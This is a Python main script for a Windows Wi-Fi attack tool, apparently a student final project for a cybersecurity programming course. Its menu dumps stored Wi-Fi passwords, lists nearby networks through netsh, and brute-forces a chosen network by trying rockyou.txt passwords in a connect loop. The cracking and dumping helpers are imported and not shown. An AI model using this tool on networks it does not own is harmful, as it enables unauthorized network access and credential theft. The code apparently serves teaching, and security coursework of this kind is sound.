# import modules
import sys

from WiFiDump import WifiDump as WD
from Crack import *

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white


def toolHeader():
    print(G +
          '''
██╗    ██╗ ██╗  ██████╗ ██████╗   █████╗   ██████╗ ██╗ 	██╗ ███████╗ ██████╗ 
██║    ██║ ██║ ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔════╝ ██╔══██╗
██║ █╗ ██║ ██║ ██║      ██████╔╝ ███████║ ██║      █████╔╝  █████╗   ██████╔╝
██║███╗██║ ██║ ██║      ██╔══██╗ ██╔══██║ ██║      ██╔═██╗  ██╔══╝   ██╔══██╗
╚███╔███╔╝ ██║ ╚██████╗ ██║  ██║ ██║  ██║ ██████╗  ██║ 	██╗ ███████╗ ██║  ██║
 ╚══╝╚══╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝  ╚═╝ 	╚═╝ ╚══════╝ ╚═╝  ╚═╝'''
          + W
          )


teamMembers = ['Khadijah Alamoudi', 'Aseel Alghamdi', 'Hessah Alnashwan']
Version = '1.0.0'


# print script options
def options():
    print(C + '----------------------------------------------------------------')
    print(C + '------------------------OPTIONS---------------------------------')
    print(C + '[1]-' + W + 'Retrieve Previously connected wifi Passwords (WifiDump)')
    print(C + '[2]-' + W + "Show Info about WiFi Networks")
    print(C + '[3]-' + W + 'Crack a Wifi Password')
    print(C + '[4]-' + W + 'Exit')
    print(C + '----------------------------------------------------------------')


def header():
    toolHeader()
    print('\n')
    print(G + "[>]" + C + "  Created By : ", G + 'GROUP[2]-CYS-F02')
    for i in range(len(teamMembers)):
        print(C + " |---> [*]", W + teamMembers[i])
    print(G + '[>] ' + C + 'Version    : ' + W + Version)
    print(
        G + '[>] ' + C + 'COPYRIGHT  : ' + W + 'Final Student Project at Imam Abdulrahman Bin Faisal University (IAU)')
    print(G + '[>] ' + C + 'COURSE     : ' + W + 'CYS 403 - Programming for Cybersecurity')
    print(G + '[>] ' + C + 'INSTRUCTOR : ' + W + 'Mr. Hussain Talal Alattas' + '\n')


header()
# loop with options for user to choose from
while True:
    options()
    c = True
    choice = ''
    # keep asking user for an option number until correct option is entered
    while c:
        try:
            choice = int(input(C + 'Enter Option Number,(e.g:1): ' + W))
            if choice not in [1, 2, 3, 4]:
                print(R + '[-] ERROR >> ' + W + 'Out Of Range Option!')
            else:
                c = False

        except KeyboardInterrupt:
            print(G + "\nExiting...")
            sys.exit()

        except Exception:
            print(R + '[-] ERROR >> Wrong Format!: ' + W + 'Enter numbers from 1 to 4', )

    if choice == 1:
        SP = WD()
        x = SP.StoredPasswords()
        SP.printInfo(x)

    elif choice == 2:
        # scan available Wi-Fi networks using cmd command
        command_output = subprocess.run(['cmd', '/c', 'netsh', 'wlan', 'show', 'networks'],
                                        capture_output=True).stdout.decode('cp1252').split('\n')
        for i in command_output:
            print(G + i)
    # Crack a Wi-Fi Password
    elif choice == 3:
        # print available Wi-Fi networks
        outputList = Crack.show_available_networks()
        # save available Wi-Fi networks result
        wifi_names = subprocess.run(["netsh", "wlan", "show", "networks", "interface=Wi-Fi"], capture_output=True
                                    ).stdout.decode('cp1252')
        try:
            flag = True
            # exception handling for Wi-Fi name input
            while flag:
                try:
                    name = input(C + '\nChoose a Wi-Fi: ' + W)
                    no_space_name = name.replace(" ", "")

                    # check if entered Wi-Fi name exists
                    if re.search(name, wifi_names):
                        flag = False
                    else:
                        print(R + '[-] ERROR >> ' + W + 'Wifi Is Not Found !')
                except Exception as e:
                    print(R + '[-] ERROR >> ' + W + 'Invalid Input:\n', e)

            password_list = []
            wordListfile = open('rockyou.txt', "r")

            for word in wordListfile:
                if len(word) >= 8:
                    password_list.append(word.replace("\n", ""))  # get all passwords with 8+ characters
            # iterate over passwords
            for password in password_list:
                createprofile(no_space_name, password)
                if Crack.connect(no_space_name, password):  # Try to get connection and test it
                    break

        except KeyboardInterrupt:  # if user existed suddenly
            print(G + "\nExiting...")
            sys.exit()

        except Exception as e:  # Catch any exceptions
            print(R + '[-] ERROR >> ' + W + e)

    else:
        break
